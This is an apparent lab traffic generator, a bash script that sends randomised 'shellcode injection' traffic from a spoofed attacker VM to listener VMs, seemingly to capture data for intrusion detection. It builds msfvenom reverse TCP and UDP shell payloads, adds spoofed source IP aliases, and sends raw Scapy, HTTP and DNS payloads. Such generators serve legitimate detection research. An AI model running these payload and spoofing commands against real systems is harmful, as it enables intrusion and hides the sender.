#!/usr/bin/env bash
#
# shellcode_vm3_random.sh – Shellcode Injection Traffic Generator
#
# • Duration: 600 s (10.0 min)
# • Random techniques (each iteration chooses one):
#     – msf_tcp_rev     (msfvenom reverse_tcp payload → netcat TCP)
#     – msf_udp_rev     (msfvenom reverse_udp payload → hping3 UDP)
#     – scapy_raw_tcp   (Scapy injects shellcode in pure TCP)
#     – scapy_raw_udp   (Scapy injects shellcode in pure UDP)
#     – http_post       (curl POST with binary body)
#     – dns_txt         (dig TXT request with encoded shellcode)
# • Tools (on VM3, attacker):
#     sudo apt update
#     sudo apt install -y metasploit-framework netcat-openbsd python3-scapy hping3 dnsutils curl
#
# ▶ Prepare VMX (victims receiving shellcode on port 9091):
#   sudo apt update
#   sudo apt install -y netcat-openbsd
#   # Start TCP/UDP listener on 9091 to “receive” shellcode
#   nohup nc -lkvp 9091 > ~/shellcode.log 2>&1 &
#   nohup nc -ulkv 9091 > ~/shellcode.log 2>&1 &
#
# ▶ Capture on VMX (before launching attacker):
#   sudo tcpdump -U -i enp0s3 -s0 -w - \
#     "net 192.168.56.0/24 and not host 192.168.56.107 and not port 9999" \
#     | nc -q 0 192.168.56.107 9999
#
# Usage on VM3 (attacker):
#   sudo ./shellcode_vm3_random.sh
#

# 1) Need root for spoofing
if [[ $EUID -ne 0 ]]; then
  echo "Run with sudo for spoofing and raw sockets" >&2
  exit 1
fi

# 2) Verify dependencies
missing=()
for cmd in msfvenom nc python3 hping3 dig curl; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done

# Scapy: generic import
python3 - <<'EOF' 2>/dev/null
import scapy
EOF
if [[ $? -ne 0 ]]; then
  missing+=(scapy)
fi

if (( ${#missing[@]} )); then
  echo "ERROR: missing tools: ${missing[*]}" >&2
  echo "Install on VM3:" >&2
  echo "  sudo apt update && sudo apt install -y metasploit-framework netcat-openbsd python3-scapy hping3 dnsutils curl" >&2
  exit 1
fi


# 3) General parameters
duration=600
end_time=$(( SECONDS + duration ))
targets=(192.168.56.101 192.168.56.102)
srcs=(192.168.56.{240..254})
iface=$(ip route | awk '/^default/ {print $5; exit}')
iface=${iface:-enp0s3}

# 4) Create IP aliases for spoofing
for ip in "${srcs[@]}"; do
  ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
done

# 5) Available techniques
techs=(msf_tcp_rev msf_udp_rev scapy_raw_tcp scapy_raw_udp http_post dns_txt)

echo "=== VM3: Random Shellcode Injection (${duration}s) on $iface ==="

# 6) Main loop (600 s)
while (( SECONDS < end_time )); do
  tech=${techs[RANDOM % ${#techs[@]}]}
  tgt=${targets[RANDOM % ${#targets[@]}]}
  src=${srcs[RANDOM % ${#srcs[@]}]}
  ts=$(date +%T)
  printf '[%s] %s → %s (src %s)\n' "$ts" "$tech" "$tgt" "$src"

  # payload lengths
  len=$((256 + RANDOM % 769))    # [256..1024] bytes

  case "$tech" in

    msf_tcp_rev)
      # Generates a RAW reverse_tcp payload and sends it via TCP to 9091
      msfvenom -p linux/x86/shell_reverse_tcp LHOST="$src" LPORT=9091 \
        -f raw -o /tmp/payload.bin &>/dev/null
      cat /tmp/payload.bin | nc -q1 -s "$src" "$tgt" 9091 &;;
    
    msf_udp_rev)
      # Generates reverse_udp payload and sends it with hping3
      msfvenom -p linux/x86/shell_reverse_udp LHOST="$src" LPORT=9091 \
        -f raw -o /tmp/payload_u.bin &>/dev/null
      hping3 --udp -p 9091 --datafile /tmp/payload_u.bin \
        --spoof "$src" -I "$iface" &>/dev/null &;;

    scapy_raw_tcp)
      # Scapy injects shellcode into TCP
      python3 - <<EOF &>/dev/null &
from scapy.all import IP,TCP,Raw,send
data = b"\x90"*16 + b"\xcc"* (len)
pkt = IP(src="$src",dst="$tgt")/TCP(dport=9091,flags="PA")/Raw(data)
send(pkt, count=1, iface="$iface", verbose=False)
EOF
      ;;

    scapy_raw_udp)
      # Scapy injects shellcode into UDP
      python3 - <<EOF &>/dev/null &
from scapy.all import IP,UDP,Raw,send
data = b"\x90"*16 + b"\xcc"* (len)
pkt = IP(src="$src",dst="$tgt")/UDP(dport=9091)/Raw(data)
send(pkt, count=1, iface="$iface", verbose=False)
EOF
      ;;

    http_post)
      # Pure HTTP POST to /upload endpoint
      dd if=/dev/urandom bs=1 count=$len 2>/dev/null > /tmp/http_payload.bin
      curl -s --interface "$src" -X POST "http://$tgt:9091/upload" \
           --data-binary @/tmp/http_payload.bin \
           --max-time 3 &>/dev/null &;;

    dns_txt)
      # DNS TXT query with HEX shellcode
      payload_hex=$(dd if=/dev/urandom bs=1 count=$((len/2)) 2>/dev/null | xxd -p)
      dig @"$tgt" TXT "$payload_hex.example.com" +time=1 +tries=1 &>/dev/null &;;
  esac

  # 7) Limit concurrency (max 6 processes)
  while (( $(jobs -r | wc -l) > 6 )); do sleep 0.2; done

  # 8) Random pause (0.1–0.5 s)
  pause=$(LC_NUMERIC=C awk -v min=0.1 -v max=0.5 \
           'BEGIN{srand(); printf "%.2f", min+rand()*(max-min)}')
  sleep "$pause"
done

# 9) Wait for completion
echo "Waiting for processes to finish..."
wait

echo "=== Shellcode Injection finished ==="
